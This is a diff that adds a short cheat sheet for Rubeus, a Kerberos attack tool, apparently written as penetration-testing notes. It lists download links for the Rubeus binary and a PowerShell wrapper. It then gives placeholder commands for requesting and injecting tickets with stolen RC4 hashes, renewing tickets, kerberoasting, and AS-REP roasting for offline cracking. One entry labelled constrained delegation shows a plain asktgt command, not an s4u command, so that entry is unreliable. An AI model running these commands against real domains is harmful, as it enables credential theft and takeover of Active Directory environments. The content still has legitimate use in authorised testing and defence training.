@@ -1,0 +1,25 @@
+# sources or compile directly from github
+https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1
+https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_Any/Rubeus.exe
+
+# get TGT for specific user using rc4_hmac, ptt = import the ticket into the current logon session
+Rubeus.exe asktgt /user:<user> /domain:<domain> /rc4:<rc4Hash> /ptt
+
+# renew TGT /ticket can also be base64 of kirbi file
+Rubeus.exe renew /ticket:<pathToKirbiFile>
+
+# constrained delegation using SPN (s4u)
+Rubeus.exe asktgt /user:<user> /domain:<domain> /rc4:<rc4>
+
+# purge all Kerberos tickets from the current logon session
+Rubeus.exe purge
+
+# kerberoasting using john format
+Rubeus.exe kerberoast /outfile:<file>.txt 
+
+# asrep roasting using john format 
+Rubeus.exe asreproast /outfile:<file>.txt 
+
+# as-rep roasting for specific user and hashcat format
+Rubeus.exe asreproast /outfile:<file>.txt /format:hashcat /user:<user>
+
